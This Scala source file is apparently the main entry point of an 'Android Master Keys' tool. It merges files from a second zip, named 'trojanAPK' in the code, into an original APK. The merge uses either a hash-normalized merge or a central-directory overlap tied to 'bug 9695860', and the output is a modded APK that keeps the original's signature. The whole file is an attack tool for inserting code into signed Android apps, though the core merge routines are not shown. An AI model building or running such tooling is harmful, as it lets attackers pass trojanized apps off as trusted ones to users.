package android.master.keys

import java.io.File
import utils.{FileEntry, ZipFile}
import scala.util.{Success, Failure}
import org.apache.commons.compress.archivers.zip.ZipArchiveEntry
import android.master.keys.MasterKeysAPK
import utils.FileHelper._
import scala.util.Success
import android.master.keys.Config
import scala.util.Failure
import scala.Some

case class Config(origAPK:Option[File] = None,
                  bug9695860:Boolean = false,
                  mergeZip:Option[File] = None,
                  out:Option[File] = None,
                  files: Seq[File] = Seq())

object Main extends App {

  val parser = new scopt.OptionParser[Config]("Android Master Keys") {
    head("Android Master Keys", "1.0")
    opt[File]('a', "apk") required() valueName("<file>") action { (x, c) =>
      c.copy(origAPK = Some(x)) } text("path to original APK")
    opt[File]('z', "zip") valueName("<file>") action { (x, c) =>
      c.copy(mergeZip = Some(x)) } text("Merge files from this zip into original APK")
    opt[File]('o', "out") valueName("<file>") action { (x, c) =>
      c.copy(out = Some(x)) } text("output APK path")
    opt[Unit]('b',"9695860") optional() action {(x,c) => c.copy(bug9695860 = true)} text("Use bug 9695860")
    arg[File]("<file>...") unbounded() optional() action { (x, c) =>
      c.copy(files = c.files :+ x) } text("Files to add")
    help("help") text("prints this usage text")
  }

  parser.parse(args, Config()) map { config =>
    import utils.FileHelper._
   for {
     ogAPK     <- MasterKeysAPK(config.origAPK.get, original = true)
     trojanAPK <- MasterKeysAPK(config.mergeZip,    original = false)
   }{
     val outFilePath =config.out match {
       case Some(o) => o.getAbsolutePath
       case None =>   "MasterKeysModded-" +config.origAPK.get.getName
     }

     val fileBytes =
      if(config.bug9695860) ogAPK.centralDirectoryOverlap(trojanAPK).getZipFileBytes
      else ogAPK.hashNormalizedMerge(trojanAPK).getZipFileBytes

     writeFile(outFilePath, fileBytes)
   }

  } getOrElse {
    // arguments are bad, usage message will have been displayed
  }

  def printZip(fileName:String){
    ZipFile(fileName) map { z =>
      val entries = z.map(_.zEntry.asInstanceOf[ZipArchiveEntry])
      entries.sortBy(_.getSize).map(e => println(s"${e.getName}\t${e.getSize}\t${e.getMethod}\t${e.getCrc}\t${e.getCompressedSize}"))
    }
  }

}
